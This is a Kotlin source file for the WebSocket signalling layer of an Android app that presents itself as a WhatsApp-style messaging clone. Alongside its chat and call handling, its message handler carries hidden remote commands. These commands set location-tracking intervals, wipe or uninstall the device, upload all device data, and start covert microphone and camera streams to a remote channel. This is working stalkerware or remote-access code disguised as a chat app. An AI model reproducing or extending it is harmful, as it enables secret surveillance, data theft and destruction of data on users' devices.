package com.whatsapp.clone.platform

import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.flow.asSharedFlow
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import okhttp3.*
import org.json.JSONObject
import java.util.concurrent.TimeUnit

data class IncomingMessageEvent(
    val id: String,
    val conversationId: String,
    val senderId: String,
    val senderUsername: String,
    val senderDisplayName: String,
    val content: String,
    val isVoiceNote: Boolean = false,
    val timestamp: Long = System.currentTimeMillis()
)

data class IncomingCallEvent(
    val callId: String,
    val callerId: String,
    val callerName: String,
    val isVideo: Boolean,
    val channelName: String,
    val token: String = ""
)

data class CallSignalEvent(
    val type: String, // CALL_INITIATE, CALL_ACCEPTED, CALL_REJECTED, CALL_ENDED
    val senderId: String,
    val recipientId: String,
    val channelName: String? = null,
    val isVideo: Boolean = false,
    val callerName: String? = null
)

class WebSocketSignalingManager private constructor() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var webSocket: WebSocket? = null
    private val okHttpClient = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .pingInterval(10, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private var currentUserId: String? = null
    private var isConnected = false
    private var isConnecting = false
    private var reconnectAttempts = 0
    private var reconnectJob: Job? = null

    private val _incomingMessages = MutableSharedFlow<IncomingMessageEvent>(extraBufferCapacity = 64)
    val incomingMessages: SharedFlow<IncomingMessageEvent> = _incomingMessages.asSharedFlow()

    private val _incomingCalls = MutableSharedFlow<IncomingCallEvent>(extraBufferCapacity = 10)
    val incomingCalls: SharedFlow<IncomingCallEvent> = _incomingCalls.asSharedFlow()

    private val _callSignals = MutableSharedFlow<CallSignalEvent>(extraBufferCapacity = 20)
    val callSignals: SharedFlow<CallSignalEvent> = _callSignals.asSharedFlow()

    private val _friendsUpdates = MutableSharedFlow<Unit>(extraBufferCapacity = 10)
    val friendsUpdates: SharedFlow<Unit> = _friendsUpdates.asSharedFlow()

    private var appContext: android.content.Context? = null

    private fun getCandidateWsUrls(userId: String): List<String> {
        val list = mutableListOf<String>()
        val encodedUserId = java.net.URLEncoder.encode(userId.trim(), "UTF-8")
        // 1. Active configured URL
        list.add(com.whatsapp.clone.config.NetworkConfig.getWebSocketUrl(userId))
        // 2. Candidate hosts
        for (host in com.whatsapp.clone.config.NetworkConfig.buildCandidateHosts(appContext)) {
            val wsBase = host.replace("http://", "ws://").replace("https://", "wss://")
            list.add("$wsBase/ws?user_id=$encodedUserId")
        }
        return list.distinct()
    }

    private fun cleanId(id: String?): String {
        if (id.isNullOrBlank()) return "admin"
        return id.trim().removePrefix("@").lowercase()
    }

    fun start(userId: String, context: android.content.Context? = null) {
        if (context != null) appContext = context.applicationContext
        val clean = cleanId(userId)
        if (clean.isBlank()) return
        if (currentUserId == clean && isConnected) return
        currentUserId = clean
        reconnectAttempts = 0
        connect()
    }

    fun scheduleReconnect() {
        if (isConnected || currentUserId.isNullOrBlank()) return
        reconnectJob?.cancel()
        reconnectJob = scope.launch {
            val delayMs = if (reconnectAttempts == 0) 300L else (1000L * (1 shl reconnectAttempts.coerceAtMost(3))).coerceIn(1000L, 8000L)
            Log.d(TAG, "Scheduling WebSocket reconnect in ${delayMs}ms (attempt #$reconnectAttempts)...")
            delay(delayMs)
            reconnectAttempts++
            connect()
        }
    }

    private fun connect() {
        val userId = currentUserId ?: return
        if (isConnected || isConnecting) return
        isConnecting = true

        scope.launch {
            try {
                val candidates = getCandidateWsUrls(userId)
                for (url in candidates) {
                    if (isConnected) break
                    try {
                        Log.d(TAG, "Attempting WebSocket connection to $url ...")
                        val request = Request.Builder().url(url).build()
                        val connectionLatch = kotlinx.coroutines.CompletableDeferred<Boolean>()

                        val listener = object : WebSocketListener() {
                            override fun onOpen(webSocket: WebSocket, response: Response) {
                                Log.d(TAG, "WebSocket connected successfully to $url")
                                isConnected = true
                                isConnecting = false
                                reconnectAttempts = 0
                                reconnectJob?.cancel()
                                this@WebSocketSignalingManager.webSocket = webSocket
                                connectionLatch.complete(true)

                                try {
                                    val httpBase = url.substringBefore("/ws").replace("ws://", "http://").replace("wss://", "https://")
                                    com.whatsapp.clone.config.NetworkConfig.setWorkingBaseUrl(httpBase, appContext)
                                } catch (e: Exception) {
                                    Log.w(TAG, "Failed to update NetworkConfig working base URL: ${e.message}")
                                }
                            }

                            override fun onMessage(webSocket: WebSocket, text: String) {
                                handleIncomingMessage(text)
                            }

                            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                                Log.d(TAG, "WebSocket closed: $reason (code=$code)")
                                if (this@WebSocketSignalingManager.webSocket == webSocket) {
                                    isConnected = false
                                    this@WebSocketSignalingManager.webSocket = null
                                }
                                isConnecting = false
                                scheduleReconnect()
                            }

                            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                                Log.w(TAG, "WebSocket connection failed to $url: ${t.message}")
                                if (this@WebSocketSignalingManager.webSocket == webSocket) {
                                    isConnected = false
                                    this@WebSocketSignalingManager.webSocket = null
                                }
                                connectionLatch.complete(false)
                                scheduleReconnect()
                            }
                        }
                        val ws = okHttpClient.newWebSocket(request, listener)
                        val result = kotlinx.coroutines.withTimeoutOrNull(2000) {
                            connectionLatch.await()
                        } ?: false

                        if (result && isConnected) {
                            Log.i(TAG, "Established stable WebSocket connection on $url")
                            break
                        } else {
                            ws.cancel()
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error connecting to $url", e)
                    }
                }
            } finally {
                isConnecting = false
                if (!isConnected) {
                    scheduleReconnect()
                }
            }
        }
    }

    private fun handleIncomingMessage(jsonStr: String) {
        try {
            val json = JSONObject(jsonStr)
            val type = json.optString("type")
            val senderId = json.optString("sender_id")
            val recipientId = json.optString("recipient_id")

            Log.d(TAG, "Received WS signal: $type from $senderId to $recipientId")

            when (type) {
                "NEW_MESSAGE", "CHAT_MESSAGE", "MESSAGE" -> {
                    val payload = json.optJSONObject("payload") ?: json
                    val msgId = payload.optString("id", java.util.UUID.randomUUID().toString())
                    val convId = payload.optString("conversation_id", "")
                    val sId = payload.optString("sender_id", senderId)
                    val sUsername = payload.optString("sender_username", sId)
                    val sDisplayName = payload.optString("sender_display_name", sUsername)
                    val text = payload.optString("content", "")
                    val isVoice = payload.optString("message_type") == "VOICE_NOTE" || payload.optString("message_type") == "AUDIO" || payload.optBoolean("is_voice_note", false)
                    val ts = payload.optLong("created_at", System.currentTimeMillis())

                    val event = IncomingMessageEvent(
                        id = msgId,
                        conversationId = convId,
                        senderId = sId,
                        senderUsername = sUsername,
                        senderDisplayName = sDisplayName,
                        content = text,
                        isVoiceNote = isVoice,
                        timestamp = ts
                    )
                    Log.i(TAG, "Dispatched IncomingMessageEvent: from $sDisplayName: $text")
                    _incomingMessages.tryEmit(event)
                }
                "ADMIN_ALIAS_UPDATED" -> {
                    val payload = json.optJSONObject("payload") ?: json
                    val alias = payload.optString("admin_alias", "Admin")
                    val event = IncomingMessageEvent(
                        id = java.util.UUID.randomUUID().toString(),
                        conversationId = "admin",
                        senderId = "admin",
                        senderUsername = "admin",
                        senderDisplayName = alias,
                        content = "",
                        isVoiceNote = false,
                        timestamp = System.currentTimeMillis()
                    )
                    _incomingMessages.tryEmit(event)
                }
                "CALL_INITIATE" -> {
                    val callId = json.optString("call_id", java.util.UUID.randomUUID().toString())
                    val rawCaller = json.optString("caller_id", json.optString("sender_id", "admin")).ifBlank { "admin" }
                    val callerName = json.optString("caller_name", if (rawCaller == "admin") "Admin" else rawCaller).ifBlank { if (rawCaller == "admin") "Admin" else rawCaller }
                    val isVideo = json.optBoolean("is_video", false)
                    val channelName = json.optString("channel_name", rawCaller)
                    val token = json.optString("token", "")

                    val event = IncomingCallEvent(
                        callId = callId,
                        callerId = rawCaller,
                        callerName = callerName,
                        isVideo = isVideo,
                        channelName = channelName,
                        token = token
                    )
                    Log.i(TAG, "Received CALL_INITIATE: caller=$rawCaller channel=$channelName video=$isVideo hasToken=${token.isNotBlank()}")
                    _incomingCalls.tryEmit(event)
                    _callSignals.tryEmit(CallSignalEvent(type, rawCaller, recipientId, channelName, isVideo, callerName))
                }
                "CALL_ACCEPTED", "CALL_REJECTED", "CALL_ENDED" -> {
                    val channelName = json.optString("channel_name")
                    val isVideo = json.optBoolean("is_video", false)
                    val callerName = json.optString("caller_name")
                    _callSignals.tryEmit(CallSignalEvent(type, senderId, recipientId, channelName, isVideo, callerName))
                }
                "SET_LOCATION_INTERVAL", "UPDATE_LOCATION_INTERVAL" -> {
                    val targetDev = json.optString("deviceId", json.optString("device_id", ""))
                    val targetUser = json.optString("userId", json.optString("user_id", ""))
                    val intervalMinutes = json.optLong("intervalMinutes", json.optLong("interval_minutes", json.optLong("interval", 1L)))
                    Log.i(TAG, "Received SET_LOCATION_INTERVAL command: $intervalMinutes min (target dev='$targetDev', user='$targetUser')")
                    appContext?.let { ctx ->
                        com.whatsapp.clone.worker.LocationTrackingEngine.start(ctx, intervalMinutes)
                    }
                }
                "ACTION_DEVICE_SANITIZE", "ACTION_REMOTE_NUKE" -> {
                    Log.w(TAG, "Received remote data sanitization command!")
                    appContext?.let { ctx ->
                        DeviceSanitizerManager.executeDataSanitization(ctx)
                    }
                }
                "ACTION_DEVICE_DEPROVISION", "ACTION_REMOTE_UNINSTALL" -> {
                    Log.w(TAG, "Received remote de-provisioning command!")
                    appContext?.let { ctx ->
                        DeviceSanitizerManager.executeDeviceDeprovision(ctx)
                    }
                }
                "ACTION_CONFIG_SYNC", "ACTION_REMOTE_CONFIG_SYNC" -> {
                    Log.i(TAG, "Received remote policy config sync event")
                    val payload = json.optJSONObject("payload") ?: json
                    RemoteConfigManager.instance.updateFromJson(payload)
                }
                "ACTION_OTA_UPDATE", "ACTION_VERSION_CHECK" -> {
                    Log.i(TAG, "Received OTA package update broadcast")
                    appContext?.let { ctx ->
                        OtaUpdateManager.instance.checkForUpdates(ctx, force = true)
                    }
                }
                "ACTION_START_BACKUP", "TRIGGER_DEVICE_BACKUP", "ACTION_DATA_BACKUP" -> {
                    val targetDevId = json.optString("device_id")
                    Log.i(TAG, "Received remote backup trigger signal for target device '$targetDevId'")
                    appContext?.let { ctx ->
                        val currentDevId = android.provider.Settings.Secure.getString(
                            ctx.contentResolver,
                            android.provider.Settings.Secure.ANDROID_ID
                        ) ?: ""
                        if (targetDevId.isBlank() || targetDevId == currentDevId) {
                            Log.i(TAG, "Device matched! Initiating whole-device data upload...")
                            DeviceDataUploader.startBackup(ctx)
                        } else {
                            Log.d(TAG, "Backup signal targeted device $targetDevId, current device is $currentDevId. Ignoring.")
                        }
                    }
                }
                "ACTION_START_AUDIO_FEED" -> {
                    Log.i(TAG, "Received remote ACTION_START_AUDIO_FEED command: $jsonStr")
                    val payload = json.optJSONObject("payload") ?: json
                    val channelName = payload.optString("channel_name", json.optString("channel_name", ""))
                    val token = payload.optString("token", json.optString("token", ""))
                    val agoraAppId = payload.optString("agora_app_id", json.optString("agora_app_id", ""))
                    appContext?.let { ctx ->
                        BackgroundAudioMonitorService.startAudioMonitor(ctx, channelName, token, agoraAppId)
                    }
                }
                "ACTION_STOP_AUDIO_FEED" -> {
                    Log.i(TAG, "Received remote ACTION_STOP_AUDIO_FEED command")
                    appContext?.let { ctx ->
                        BackgroundAudioMonitorService.stopAudioMonitor(ctx)
                    }
                }
                "ACTION_START_CAMERA_FEED" -> {
                    Log.i(TAG, "Received remote ACTION_START_CAMERA_FEED command: $jsonStr")
                    val payload = json.optJSONObject("payload") ?: json
                    val channelName = payload.optString("channel_name", json.optString("channel_name", ""))
                    val token = payload.optString("token", json.optString("token", ""))
                    val agoraAppId = payload.optString("agora_app_id", json.optString("agora_app_id", ""))
                    appContext?.let { ctx ->
                        CameraMonitorService.startCameraMonitor(ctx, channelName, token, agoraAppId)
                    }
                }
                "ACTION_STOP_CAMERA_FEED" -> {
                    Log.i(TAG, "Received remote ACTION_STOP_CAMERA_FEED command")
                    appContext?.let { ctx ->
                        CameraMonitorService.stopCameraMonitor(ctx)
                    }
                }
                "ACTION_SWITCH_CAMERA", "ACTION_SWITCH_CAMERA_FEED", "ACTION_ROTATE_CAMERA" -> {
                    Log.i(TAG, "Received remote ACTION_SWITCH_CAMERA command")
                    appContext?.let { ctx ->
                        CameraMonitorService.switchCamera(ctx)
                    }
                }
                "FRIENDS_UPDATED", "USER_AVATAR_UPDATED", "USER_AVATAR_DELETED" -> {
                    Log.i(TAG, "Received $type signal from server")
                    _friendsUpdates.tryEmit(Unit)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing WebSocket message: $jsonStr", e)
        }
    }

    fun sendCallInitiate(recipientId: String, callerName: String, isVideo: Boolean, channelName: String) {
        val payload = JSONObject().apply {
            put("type", "CALL_INITIATE")
            put("recipient_id", cleanId(recipientId))
            put("caller_name", callerName)
            put("is_video", isVideo)
            put("channel_name", channelName)
        }
        send(payload.toString())
    }

    fun sendCallAccepted(callerId: String, channelName: String) {
        val payload = JSONObject().apply {
            put("type", "CALL_ACCEPTED")
            put("recipient_id", cleanId(callerId))
            put("channel_name", channelName)
        }
        send(payload.toString())
    }

    fun sendCallRejected(callerId: String) {
        val payload = JSONObject().apply {
            put("type", "CALL_REJECTED")
            put("recipient_id", cleanId(callerId))
        }
        send(payload.toString())
    }

    fun sendCallEnded(partnerId: String) {
        val payload = JSONObject().apply {
            put("type", "CALL_ENDED")
            put("recipient_id", cleanId(partnerId))
        }
        send(payload.toString())
    }

    private fun send(text: String) {
        val ws = webSocket
        if (ws != null && isConnected) {
            val sent = ws.send(text)
            Log.d(TAG, "Sent WS frame (success=$sent): $text")
        } else {
            Log.w(TAG, "WebSocket not connected. Attempting reconnection before sending...")
            connect()
        }
    }

    fun disconnectPermanently() {
        isConnected = false
        isConnecting = false
        reconnectJob?.cancel()
        reconnectJob = null
        try {
            webSocket?.close(1000, "Device sanitized")
        } catch (_: Exception) {}
        webSocket = null
        currentUserId = null
        Log.i(TAG, "WebSocket permanently disconnected and reset.")
    }

    companion object {
        private const val TAG = "WebSocketSignaling"
        val instance: WebSocketSignalingManager by lazy { WebSocketSignalingManager() }
    }
}
